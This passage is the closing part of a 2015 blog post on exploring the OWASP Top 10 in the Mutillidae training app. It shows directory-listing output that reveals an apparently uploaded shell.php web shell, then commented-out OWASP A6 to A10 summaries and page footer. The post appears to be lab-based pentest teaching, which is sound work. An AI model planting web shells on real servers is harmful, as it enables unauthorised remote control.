</span><span class='line'><span class="o">.</span> <span class="mo">02</span><span class="o">/</span><span class="mo">05</span><span class="o">/</span><span class="mi">2015</span> <span class="mi">11</span><span class="o">:</span><span class="mi">24</span> <span class="nx">AM</span>
</span><span class='line'><span class="o">..</span> <span class="mo">02</span><span class="o">/</span><span class="mo">05</span><span class="o">/</span><span class="mi">2015</span> <span class="mi">11</span><span class="o">:</span><span class="mo">05</span> <span class="nx">AM</span> <span class="mi">132</span> <span class="nx">shell</span><span class="o">.</span><span class="nx">php</span> <span class="mi">1</span> <span class="nx">File</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="mi">132</span> <span class="nx">bytes</span> <span class="mi">2</span> <span class="nx">Dir</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="mi">12</span><span class="p">,</span><span class="mi">596</span><span class="p">,</span><span class="mi">895</span><span class="p">,</span><span class="mi">744</span> <span class="nx">bytes</span> <span class="nx">free</span> <span class="nb">dir</span>
</span></code></pre></td></tr></table></div></figure>


<h3>To be continued&hellip;</h3>

<!--

## A6 Sensitive Data Exposure

Many web applications do not properly protect sensitive data, such as credit cards, tax IDs, and authentication credentials. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data deserves extra protection such as encryption at rest or in transit, as well as special precautions when exchanged with the browser. 

## A7 Missing Function Level Access Control

Most web applications verify function level access rights before making that functionality visible in the UI. However, applications need to perform the same access control checks on the server when each function is accessed. If requests are not verified, attackers will be able to forge requests in order to access functionality without proper authorization. 

## A8 Cross-Site Request Forgery (CSRF)

A CSRF attack forces a logged-on victim’s browser to send a forged HTTP request, including the victim’s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim’s browser to generate requests the vulnerable application thinks are legitimate requests from the victim. 

## A9 Using Components with Known Vulnerabilities

Components, such as libraries, frameworks, and other software modules, almost always run with full privileges. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications using components with known vulnerabilities may undermine application defenses and enable a range of possible attacks and impacts. 

## A10 Unvalidated Redirects and Forwards

Web applications frequently redirect and forward users to other pages and websites, and use untrusted data to determine the destination pages. Without proper validation, attackers can redirect victims to phishing or malware sites, or use forwards to access unauthorized pages. 
-->

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Mindaugas Slusnys</span></span>

      








  


<time datetime="2015-02-03T10:48:16-05:00" pubdate data-updated="true"></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/owasp/'>owasp</a>, <a class='category' href='/blog/categories/pentest/'>pentest</a>, <a class='category' href='/blog/categories/web/'>web</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/02/02/damn-vulnerable-web-application/" title="Previous Post: Exploring Damn Vulnerable Web Application">&laquo; Exploring Damn Vulnerable Web Application</a>
      
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/02/03/owasp-top-10-in-mutillidae/">OWASP Top 10 in Mutillidae (Part 1)</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/02/02/damn-vulnerable-web-application/">Exploring Damn Vulnerable Web Application</a>
      </li>
    
  </ul>
</section>


  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Mindaugas Slusnys -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  











</body>
</html>
